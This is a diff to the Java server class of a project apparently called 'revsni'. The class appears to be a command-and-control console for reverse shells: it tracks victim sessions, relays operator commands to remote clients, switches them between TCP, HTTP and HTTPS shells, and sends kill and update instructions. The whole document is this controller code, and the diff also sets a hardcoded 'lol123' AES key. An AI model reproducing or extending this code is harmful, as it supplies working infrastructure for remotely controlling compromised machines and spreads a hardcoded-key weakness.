@@ -7,7 +7,6 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.security.NoSuchAlgorithmException;
 import java.security.spec.InvalidKeySpecException;
-import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Objects;
@@ -22,9 +21,9 @@ import com.revsni.common.Configuration;
 import com.revsni.common.Sessionerino;
 import com.revsni.common.Configuration.EncMode;
 import com.revsni.common.Configuration.Mode;
+import com.revsni.server.encryption.AES;
 //import com.revsni.server.encryption.AES;
 import com.revsni.server.encryption.Encri;
-import com.revsni.server.encryption.RSA;
 import com.revsni.server.http.HTTPShell;
 import com.revsni.server.https.HTTPSShell;
 import com.revsni.server.tcp.Handler;
@@ -63,6 +62,7 @@ public class Server implements Runnable{
     private volatile HTTPSShell httpsShell;
     private volatile Listener listener;
     public volatile ThreadMonitor threadMonitor;
+    public volatile Protocol protocol;
 
     //Sessions
     public volatile int sessionNumber;
@@ -87,7 +87,9 @@ public class Server implements Runnable{
     public static HashMap<Integer, Encri> clientEnc = new HashMap<>();
 
     //public static AES initEncri = new AES("lol123", "lol123");
-    public static RSA initEncri = new RSA();
+    //public static RSA initEncri = new RSA();
+
+    public static AES initEncri = new AES("lol123", "lol123");
 
     private Configuration configuration;
 
@@ -120,7 +122,6 @@ public class Server implements Runnable{
         //this.ip = ip;
         //this.pass = password;
         //this.salt = saltForPass;
-        initEncri.initCiphers();
         updater = new Updater(ip, port, initEncri);
 
         try {
@@ -165,7 +166,7 @@ public class Server implements Runnable{
                             case("usage"): printUsage(); break;
                             case("configure"): printConfigure(); break;
                             case("switch"):
-                                if(sessionNumber == 0) {  break; } 
+                                if(sessionNumber == 0) {  logger.error("No clients connected for switch!\n"); break; } 
                                 printSwitch();
                                 System.out.println("---Enter anything else to leave this menu.---\n");
                                 printIn();
@@ -174,11 +175,11 @@ public class Server implements Runnable{
                                     case("http"): 
                                         System.out.print("Specify a Port on which HTTP-Server should listen on: ");
                                         int port = Integer.parseInt(bufferedReader.readLine());
-                                        httpShell = new HTTPShell(key, iv, port, sessionNumber);
+                                        httpShell = new HTTPShell(port, sessionNumber, protocol);
                                         updater.setShellType("HTTP", String.valueOf(httpShell.getPort()));
                                         updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                         updater.writeOut(getUUID(sessionNumber));
-                                        send(sessionNumber, "httpSw");
+                                        senderino("httpSw", sessionNumber);
                                         setInteraction(sessionNumber, httpShell);
                                         setMode(sessionNumber, Mode.HTTP);
                                         logger.info("Switch done!");
@@ -192,7 +193,7 @@ public class Server implements Runnable{
                                         updater.setShellType("HTTPS", String.valueOf(getInteraction(sessionNumber).getPort()));
                                         updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                         updater.writeOut(getUUID(sessionNumber));
-                                        send(sessionNumber, "httpsSw");
+                                        senderino("httpsSw", sessionNumber);;
                                         setInteraction(sessionNumber, httpsShell);
                                         setMode(sessionNumber, Mode.HTTPS);
                                         break;
@@ -203,6 +204,7 @@ public class Server implements Runnable{
                                 break;
                             case("mode"): printMode(); break;
                             case("kill"): if(sessionNumber == 0) { break; } getInteraction(sessionNumber).sendCommand("kill"); getInteraction(sessionNumber).sendCommand("exit"); break;
+                            case("remove"): removeSession(sessionNumber); sessionNumber = 0; break;
                             case("exit"): Revsni.setActive(false); return;
                             case("encryption"): printEncryption(); break;
                             case("bg"):
@@ -232,27 +234,15 @@ public class Server implements Runnable{
                                     if(checkIfOnline(sessionNumber)) {
                                         if(getMode(sessionNumber).toString().equals("TCP")) {
                                             //logger.info("Message: " + message);
-                                            try {
-                                                send(sessionNumber, message, sessNumUUID.get(sessionNumber));
-                                            } catch(Exception e) {
-                                                e.printStackTrace();
-                                                logger.error("Failed to send command: '"+message+"'!");
-                                                
-                                                if(sessionHandlers.keySet().isEmpty()) {
-                                                    logger.error("No clients are connected!");
-                                                    sessionNumber = 0;
-                                                    break;
-                                                                      
-                                                }
-                                            }
+                                            senderino(message, sessionNumber);
                                             
                                         }
                                         if(getMode(sessionNumber).toString().equals("HTTP")) {
-                                            send(sessionNumber, message);
+                                            senderino(message, sessionNumber);
                                             //sessionHandlers.get(sessionNumber).sendCommand(message);
                                         }
                                         if(getMode(sessionNumber).toString().equals("HTTPS")) {
-                                            send(sessionNumber, message);
+                                            senderino(message, sessionNumber);
                                             //sessionHandlers.get(sessionNumber).sendCommand(message);
                                         }
                                     }
@@ -290,6 +280,21 @@ public class Server implements Runnable{
             logger.info("Session: + " + sessionNumber + " went offline due to unknown fkin reasons.");
         }
     }
+
+    public void senderino(String message, int sessionNumber) {
+        try {
+            send(sessionNumber, message, sessNumUUID.get(sessionNumber));
+        } catch(Exception e) {
+            e.printStackTrace();
+            logger.error("Failed to send command: '"+message+"'!");
+            
+            if(sessionHandlers.keySet().isEmpty()) {
+                logger.error("No clients are connected!");
+                sessionNumber = 0;
+                                  
+            }
+        }
+    }
     public void send(int sessionNumber, String message, String uuid) {
         if(checkIfOnline(sessionNumber)) {
             getInteraction(sessionNumber).sendCommand(message, uuid);
@@ -301,6 +306,7 @@ public class Server implements Runnable{
     public boolean checkIfOnline(int sessionNumber) {
         Boolean ret = false;
         try {
+            if(modePortUUID.get(sessionNumber).getKey().name().equals("HTTP")) { return true; }
             Handler handler = (Handler) sessionHandlers.get(sessionNumber);
             ret = handler.checkIfOnline();
             return ret;
@@ -377,7 +383,7 @@ public class Server implements Runnable{
     //Session handling
 
     public static void addSession(String uuid, String os, int sessionNumber) {
-        loggerS.info("Added Session Nr. " + sessionNumber + " to the session list!");
+        loggerS.info("\nAdded Session Nr. " + sessionNumber + " to the session list!\n");
         sessionNumOsStatic.put(sessionNumber, os);
         sessNumUUIDSatic.put(sessionNumber, uuid);
  
@@ -576,8 +582,13 @@ public class Server implements Runnable{
         return clientEnc;
     }
 
-    public void deliverNewPrivKey(int sessionNumber) {
+    
+    public void deliverNewFile(int sessionNumber) {
         String uuid = sessNumUUIDSatic.get(sessionNumber);
+        
+        /* RSA */
+
+        /*
         initEncri.generateClientKeyPair(uuid);
         try {
             updater.setPrivKey(initEncri.getClientPrivKey(uuid));
@@ -587,7 +598,17 @@ public class Server implements Runnable{
         } catch (IOException e) {
             e.printStackTrace();
         }
+        */
+
+        /* AES */
+        try {
+            updater.generateOutputString(configuration.getEncMode());
+            updater.writeOut(uuid);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
+    
 
 
     //Useful
@@ -599,6 +620,10 @@ public class Server implements Runnable{
             }
         }
         return null;
+    }
+
+    public void setProtocol(Protocol prot) {
+        this.protocol = prot;
     }
 
 
